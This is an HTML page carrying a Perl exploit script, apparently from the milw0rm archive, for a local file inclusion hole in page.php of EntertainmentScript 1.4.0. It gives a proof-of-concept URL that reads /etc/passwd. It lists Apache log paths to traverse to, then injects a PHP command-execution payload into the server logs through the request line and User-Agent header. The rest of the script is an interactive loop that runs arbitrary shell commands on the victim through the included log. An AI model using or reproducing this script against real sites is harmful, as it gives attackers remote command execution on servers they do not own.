<html><head><title>EntertainmentScript 1.4.0 (page.php page) Local File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
# EntertainmentScript V1.4.0 (( page.php  page)) Local File Inclusion Exploit
########################################
#[*] Founded &amp;  Exploited by : Stack-Terrorist [v40]
#[*] Contact: Ev!L =&gt;&gt; see down
#[*] Greetz : Houssamix &amp; Djekmani &amp; Jadi &amp; iuoisn &amp; All muslims HaCkeRs  :)
# P0c : http://localhost.il/page.php?page=../../../../../etc/passwd%00
########################################
#----------------------------------------------------------------------------#
########################################
# * TITLE:          PerlSploit Class
# * REQUIREMENTS:   PHP 4 / PHP 5
# * VERSION:        v.1
# * LICENSE:        GNU General Public License
# * ORIGINAL URL:   http://www.v4-Team/v4.txt
# * FILENAME:       PerlSploitClass.pl
# *
# * CONTACT:        dj-moad@hotmail.fr (french / english / arabic / moroco Darija :d )
# * THNX : AllaH
# * GREETZ:         Houssamix &amp; Djekmani
########################################
#----------------------------------------------------------------------------#
########################################
use IO::Socket;
use LWP::Simple;
########################################
#--------------------------------------ripped----------------------------------------#
########################################
@apache=(
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../.. /../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;
);
########################################
#----------------------------------------------------------------------------#
########################################
if (@ARGV &lt; 3) {
print &quot;
===============================================================
# EntertainmentScript V1.4.0  Local File Inclusion Exploit    #
#           perl $0 [Victim] / (apachepath)               #
#        Ex:perl $0 [Victim] / ../logs/error.log          #
===============================================================
#           Greetz To: Tryag-Team &amp; v4 Team &amp; H-T Team        #
#                   by : Stack-Terrorist [v40]                #
===============================================================
&quot;;
exit();
}
########################################
#----------------------------------------------------------------------------#
########################################
$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];
########################################
#----------------------------------------------------------------------------#
########################################
print &quot;Code is injecting in logfiles...\n&quot;;
$CODE=&quot;&lt;?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?&gt;&quot;;
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;Connection failed.\n\n&quot;;
print $socket &quot;GET &quot;.$path.$CODE.&quot; HTTP/1.1\r\n&quot;;
print $socket &quot;user-Agent: &quot;.$CODE.&quot;\r\n&quot;;
print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
close($socket);
print &quot;Write END to exit!\n&quot;;
print &quot;If not working try another apache path\n\n&quot;;
########################################
#----------------------------------------------------------------------------#
########################################
print &quot;[shell] &quot;;$cmd = &lt;STDIN&gt;;
while($cmd !~ &quot;END&quot;) {
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;Connection failed.\n\n&quot;;
########################################
#--------------------------------now include parameter-------------------------#
########################################

print $socket &quot;GET &quot;.$path.&quot;/page.php?page=&quot;.$apache[$apachepath].&quot;%00&amp;cmd=$cmd HTTP/1.1\r\n&quot;;
print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
print $socket &quot;Accept: */*\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
while ($raspuns = &lt;$socket&gt;)
{
print $raspuns;
}
print &quot;[shell] &quot;;
$cmd = &lt;STDIN&gt;;
}
########################################
#----------------------Exploited by : Stack-Terrorist [v40]-----------------#
########################################

# milw0rm.com [2008-05-20]</pre></html>